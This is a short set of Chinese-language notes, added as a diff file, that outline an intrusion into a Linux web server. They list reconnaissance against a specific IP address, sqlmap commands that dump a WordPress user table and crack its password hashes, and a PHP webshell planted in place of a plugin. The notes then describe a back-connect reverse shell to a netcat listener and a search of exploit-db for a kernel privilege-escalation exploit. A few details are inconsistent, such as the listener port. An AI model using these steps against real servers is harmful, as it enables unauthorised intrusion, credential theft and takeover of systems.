@@ -1,0 +1,29 @@
+linux下入侵的基本过程：http://www.freebuf.com/articles/web/7359.html
+1:ping    :218.94.157.1382:
+2:Sameip.org
+3:Who.is
+4:Whatweb
+5:Nmap
+6:Nikto.pl/W3AF
+7:sqlmap –u url
+-dbs
+用dump –Dwordpress -tables导出wordpress数据库表
+使用参数 “-T wp_users –columns “
+使用参数 -C user_login,user_pass –dump 来导出列。
+把MD5转换成明文密码（并不是所有HASH都能成功转换）
+8:登录后台
+9：上传一个php webshell 用来在这台服务器上执行一些linux命令编辑wordpress的“Textile”插件，入一个php webshell来代替一个真正的插件。之后点击上传，php webshell就被成功上传到服务器上了。现在，PHP WEBSHELL就成功运行了。现在就可以浏览网站里所有的文件了，但是我们想得到服务器的root权限然后入侵其他的站点。
+选择 在php webshell 里的“back-connect “然后连接到我们的ip “192.168.1.6″ 端口 “5555″，在我们点击连接之前，我们先得在本机上监听一个“5555”的端口 命令：nc -lvvp 555点击连接，我们会得到这样一个窗口：……，我们来试一下linux的命令ID命令用来告诉我们用户ID和用户组
+Pwd命令能告诉我们现在所在的路径
+uname –a 命令用来得到一些信息以及内核版本
+好了，我们现在知道服务器的内核版本是2.6.31.5-127.fc12.1686
+Ok, now we knew that server kernel version is 2.6.31.5-127.fc12.1686
+我们可以在 exploit-db.com 找到针对这个版本的exploit
+输入： “kernel 2.6.31 “
+
+
+1:whatweb
+
+
+
+
